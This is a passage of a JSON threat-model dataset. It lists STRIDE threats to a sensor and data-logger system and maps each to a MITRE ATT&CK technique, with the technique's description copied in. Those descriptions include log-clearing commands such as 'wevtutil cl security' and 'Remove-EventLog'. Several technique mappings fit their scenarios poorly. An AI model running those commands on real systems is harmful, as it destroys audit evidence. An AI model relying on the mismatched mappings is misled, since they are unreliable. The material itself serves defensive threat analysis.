                    "Assumption": "Weak permission settings are utilized.",
                    "Role": "System Administrator",
                    "Condition": "Improper configuration of permissions."
                },
                {
                    "Assumption": "There is no monitoring of access to metadata.",
                    "Role": "Security Analyst",
                    "Condition": "Absence of access logging and monitoring."
                },
                {
                    "Assumption": "The attacker has obtained limited access to the system.",
                    "Role": "Unauthorized User",
                    "Condition": "Limited yet insufficiently controlled user access."
                }
            ],
            "Potential Impact": "Access to critical and sensitive contextual information, potential misuse.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "metadata access",
                "permission settings",
                "monitoring"
            ],
            "mitre_technique": {
                "name": "Permission Groups Discovery",
                "description": "Adversaries may attempt to discover group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.\n\nAdversaries may attempt to discover group permission settings in many different ways. This data may provide the adversary with information about the compromised environment that can be used in follow-on activity and targeting.(Citation: CrowdStrike BloodHound April 2018)",
                "id": "attack-pattern--15dbf668-795c-41e6-8219-f0447c0e64ce",
                "technique_id": "T1069"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker could gain higher privileges on the data logger to manipulate sensor data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can access the data logger interface.",
                    "Role": "Network Attacker",
                    "Condition": "Vulnerability allowing interface access."
                },
                {
                    "Assumption": "The data logger software has privilege escalation flaws.",
                    "Role": "Software Developer",
                    "Condition": "Flaws in the software allowing privilege elevation."
                },
                {
                    "Assumption": "There are no stringent security audits.",
                    "Role": "Compliance Officer",
                    "Condition": "Lack of robust auditing of data logger operations."
                }
            ],
            "Potential Impact": "Data integrity at risk, potential falsification of sensor data, impacting prediction accuracy.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "data logger",
                "sensor data",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        }
    ]
},
{
    "case_number": "9",
    "batch_number": "27",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate sensor to inject false data into the system.",
            "Assumptions": [
                {
                    "Assumption": "Sensors communicate over insecure channels.",
                    "Role": "System Architect",
                    "Condition": "Absence of encryption or secure communication protocols."
                },
                {
                    "Assumption": "Sensors lack robust authentication mechanisms.",
                    "Role": "Device Manufacturer",
                    "Condition": "No authentication protocol implemented."
                },
                {
                    "Assumption": "Attacker has access to the network.",
                    "Role": "Network Security Admin",
                    "Condition": "Insufficient network security measures."
                }
            ],
            "Potential Impact": "Unauthorized disclosure, data corruption.",
            "MITRE ATT&CK Keywords": [
                "Impersonation",
                "Injection",
                "Network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains unauthorized access to the Dashboard by bypassing authentication methods.",
            "Assumptions": [
                {
                    "Assumption": "Weak or no authentication mechanisms are in place.",
                    "Role": "Application Developer",
                    "Condition": "Dashboard authentication not enforced or weak."
                },
                {
                    "Assumption": "User credentials are obtainable through social engineering.",
                    "Role": "End User",
                    "Condition": "Users are susceptible to phishing attacks."
                },
                {
                    "Assumption": "System monitors do not detect unauthorized access.",
                    "Role": "Security Operations Center",
                    "Condition": "No real-time monitoring and alerting mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Dashboard",
                "User Access"
            ],
            "mitre_technique": {
                "name": "Process Argument Spoofing",
                "description": "Adversaries may attempt to hide process command-line arguments by overwriting process memory. Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process. The PEB includes the process command-line arguments that are referenced when executing the process. When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB.(Citation: Microsoft PEB 2021)(Citation: Xpn Argue Like Cobalt 2019)\n\nAdversaries may manipulate a process PEB to evade defenses. For example, [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) can be abused to spawn a process in a suspended state with benign arguments. After the process is spawned and the PEB is initialized (and process information is potentially logged by tools/sensors), adversaries may override the PEB to modify the command-line arguments (ex: using the [Native API](https://attack.mitre.org/techniques/T1106) <code>WriteProcessMemory()</code> function) then resume process execution with malicious arguments.(Citation: Cobalt Strike Arguments 2019)(Citation: Xpn Argue Like Cobalt 2019)(Citation: Nviso Spoof Command Line 2020)\n\nAdversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis.(Citation: FireEye FiveHands April 2021)\n\nThis behavior may also be combined with other tricks (such as [Parent PID Spoofing](https://attack.mitre.org/techniques/T1134/004)) to manipulate or further evade process-based detections.",
                "id": "attack-pattern--ffe59ad3-ad9b-4b9f-b74f-5beb3c309dc1",
                "technique_id": "T1564.010"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates the Anonymity (Anon) Agent to capture and modify data before it is anonymized.",
            "Assumptions": [
                {
                    "Assumption": "The Anon Agent lacks secure authentication protocols.",
                    "Role": "System Architect",
                    "Condition": "Absence of robust authentication measures."
                },
                {
                    "Assumption": "Network traffic is not monitored for suspicious activities.",
                    "Role": "Network Security Admin",
                    "Condition": "Absence of Intrusion Detection Systems."
                },
                {
                    "Assumption": "An attacker has knowledge of the system architecture.",
                    "Role": "System Architect",
                    "Condition": "System design and documentation leaked."
                }
            ],
            "Potential Impact": "Data confidentiality and integrity breach.",
            "MITRE ATT&CK Keywords": [
                "Impersonation",
                "Anonymization",
                "Data Tampering",
                "Network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker tampers with the data collected by sensors before it is received by the Data Logger.",
            "Assumptions": [
                {
                    "Assumption": "Sensors communicate over an unencrypted network.",
                    "Role": "System Architect",
                    "Condition": "Use of insecure communication channels."
                },
                {
                    "Assumption": "No integrity checks on sensor data.",
                    "Role": "System Developer",
                    "Condition": "Lack of checksums or hash functions."
                },
                {
                    "Assumption": "Able to access the physical location or network of sensors.",
                    "Role": "Physical Security",
                    "Condition": "Weak physical security measures."
                }
            ],
            "Potential Impact": "Data integrity compromised.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Data Integrity",
                "Network",
                "Sensor"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Unauthorized changes are made to the AI/ML models deployed in the TOREADOR platform.",
            "Assumptions": [
                {
                    "Assumption": "Weak or lack of update controls for AI/ML models.",
                    "Role": "System Developer",
                    "Condition": "Inadequate version control and audit trails."
                },
                {
                    "Assumption": "Attacker gains insider access or exploits a vulnerability.",
                    "Role": "System Admin",
                    "Condition": "Insider threat or unpatched vulnerabilities."
                },
                {
                    "Assumption": "Model files are not encrypted or protected.",
                    "Role": "System Developer",
                    "Condition": "Models stored in plain-text or unprotected environments."
                }
            ],
            "Potential Impact": "Data integrity and availability compromised.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "AI/ML Models",
                "Insider Threat",
                "Version Control"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies system metadata to mislead prediction models.",
            "Assumptions": [
                {
                    "Assumption": "Metadata lacks integrity protection.",
                    "Role": "System Developer",
                    "Condition": "No validation checks on metadata."
                },
                {
                    "Assumption": "An attacker has the capability to alter metadata storage systems.",
                    "Role": "System Admin",
                    "Condition": "Insufficient access controls on storage systems."
                },
                {
                    "Assumption": "Metadata updates are not logged or monitored.",
                    "Role": "Security Operations Center",
                    "Condition": "Absence of audit logs and monitoring."
                }
            ],
            "Potential Impact": "Data integrity and prediction accuracy compromised.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Metadata",
                "Data Manipulation",
                "Storage System"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies initiating a command to adjust power flow, claiming the action was unauthorized.",
            "Assumptions": [
                {
                    "Assumption": "System lacks proper logging and audit trails.",
                    "Role": "System Developer",
                    "Condition": "No comprehensive logging mechanisms."
                },
                {
                    "Assumption": "No digital signatures for command verification.",
                    "Role": "System Architect",
                    "Condition": "Commands are not signed or verified."
                },
                {
                    "Assumption": "User actions are not tied to unique identities.",
                    "Role": "System Admin",
                    "Condition": "Actions are not linked to authenticated user accounts."
                }
            ],
            "Potential Impact": "Action accountability and integrity compromised.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Command Execution",
                "Logging",
                "Digital Signatures"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An employee claims not to have accessed sensitive prediction data, denying any involvement.",
            "Assumptions": [
                {
                    "Assumption": "No user action logs.",
                    "Role": "System Developer",
                    "Condition": "Lack of action logging for user activities."
                },
                {
                    "Assumption": "Audit trails are not tamper-proof.",
                    "Role": "Security Operations Center",
                    "Condition": "Audit logs can be altered or wiped."
                },
                {
                    "Assumption": "User sessions are not uniquely identifiable.",
                    "Role": "System Admin",
                    "Condition": "No unique session identifiers for users."
                }
            ],
            "Potential Impact": "Accountability for data access compromised.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Data Access",
                "Logging",
                "Audit Trails"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker claims that a malicious model update was done by an authorized user, obscuring their actions.",
            "Assumptions": [
                {
                    "Assumption": "Update actions are not logged or verified.",
                    "Role": "System Developer",
                    "Condition": "Absence of logging for model updates."
                },
                {
                    "Assumption": "System does not differentiate update actors.",
                    "Role": "System Admin",
                    "Condition": "Lack of role-based access control."
                },
                {
                    "Assumption": "No timestamping for changes.",
                    "Role": "Security Operations Center",
                    "Condition": "Changes are not timestamped."
                }
            ],
            "Potential Impact": "Repudiation of update actions and integrity compromised.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Model Updates",
                "Logging",
                "Access Control"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Data intercepted during transmission between sensors and Data Logger.",
            "Assumptions": [
                {
                    "Assumption": "Communication is not encrypted.",
                    "Role": "System Architect",
                    "Condition": "Use of insecure communication protocols."
                },
                {
                    "Assumption": "No network traffic monitoring.",
                    "Role": "Network Security Admin",
                    "Condition": "Lack of Intrusion Detection Systems."
                },
                {
                    "Assumption": "Sensitive data sent in plaintext.",
                    "Role": "System Developer",
                    "Condition": "Insecure data transmission methods."
                }
            ],
            "Potential Impact": "Confidentiality of sensor data compromised.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Data Interception",
                "Network",
                "Encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Attacker accesses anonymized data in the TOREADOR platform through improper access controls.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient access controls to the TOREADOR platform.",
                    "Role": "System Admin",
                    "Condition": "Weak Access Control Policies."
                },
                {
                    "Assumption": "Attackers can escalate privileges.",
                    "Role": "Security Operations Center",
                    "Condition": "Vulnerabilities enabling Privilege Escalation."
                },
                {
                    "Assumption": "Weak account management practices.",
                    "Role": "Application Developer",
                    "Condition": "Absence of strong authentication methods."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive, anonymized data.",
            "MITRE ATT&CK Keywords": [
                "Data Disclosure",
                "Access Controls",
                "Privilege Escalation",
                "Account Management"
            ],
            "mitre_technique": {
                "name": "Additional Cloud Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)",
                "id": "attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3",
                "technique_id": "T1098.003"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data in storage is accessed by unauthorized actors due to inadequate encryption.",
            "Assumptions": [
                {
                    "Assumption": "Data in storage is not encrypted.",
                    "Role": "System Architect",
                    "Condition": "Data stored in plaintext."
                },
                {
                    "Assumption": "Weak storage access controls.",
                    "Role": "System Admin",
                    "Condition": "Lack of Restrictive Access Controls on Storage."
                },
                {
                    "Assumption": "No monitoring of storage access.",
                    "Role": "Security Operations Center",
                    "Condition": "Absence of audit logging for storage access."
                }
            ],
            "Potential Impact": "Data confidentiality compromised.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Storage Security",
                "Encryption",
                "Access Control"
            ],
            "mitre_technique": {
                "name": "Direct Volume Access",
                "description": "Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)\n\nUtilities, such as `NinjaCopy`, exist to perform these actions in PowerShell.(Citation: Github PowerSploit Ninjacopy) Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and [esentutl](https://attack.mitre.org/software/S0404)) to create shadow copies or backups of data from system volumes.(Citation: LOLBAS Esentutl)",
                "id": "attack-pattern--0c8ab3eb-df48-4b9c-ace7-beacaac81cc5",
                "technique_id": "T1006"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the sensor network with traffic, disrupting data collection.",
            "Assumptions": [
                {
                    "Assumption": "No mitigation for network flooding attacks.",
                    "Role": "Network Security Admin",
                    "Condition": "Absence of Rate Limiting and Filtering."
                },
                {
                    "Assumption": "Sensors have limited processing capacity.",
                    "Role": "Device Manufacturer",
                    "Condition": "Sensors cannot handle excessive load."
                },
                {
                    "Assumption": "No redundancy in sensor network.",
                    "Role": "System Architect",
                    "Condition": "Lack of Failover Mechanisms."
                }
            ],
            "Potential Impact": "Availability of sensor data compromised.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Network Flooding",
                "Traffic Management",
                "Redundancy"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
